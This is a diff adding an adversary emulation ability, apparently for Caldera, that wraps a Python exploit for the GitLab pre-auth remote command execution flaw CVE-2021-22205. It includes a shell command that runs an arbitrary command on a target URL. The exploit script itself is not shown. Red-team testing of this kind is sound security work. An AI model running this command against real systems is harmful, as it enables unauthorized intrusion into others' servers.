@@ -1,0 +1,29 @@
+- id: 53b3754c-def4-4699-a673-1d85648fda6a
+  name: GitLab Pre-Auth RCE (CVE-2021-22205)
+  description: Exploit GitLab Pre-Auth Remote Command Execution vulnerability (CVE-2021-22205)
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 #{payload_path}/gitlab_rce.py #{target.url} "#{command}"
+        payloads:
+          - gitlab_rce.py
+    darwin:
+      sh:
+        command: |
+          python3 #{payload_path}/gitlab_rce.py #{target.url} "#{command}"
+        payloads:
+          - gitlab_rce.py
+  input_arguments:
+    target.url:
+      description: The URL of the target GitLab instance
+    command:
+      description: The command to execute on the target system
+  requirements:
+    - plugins.stockpile.app.requirements.basic:
+        - source: target.url
+  cleanup: []
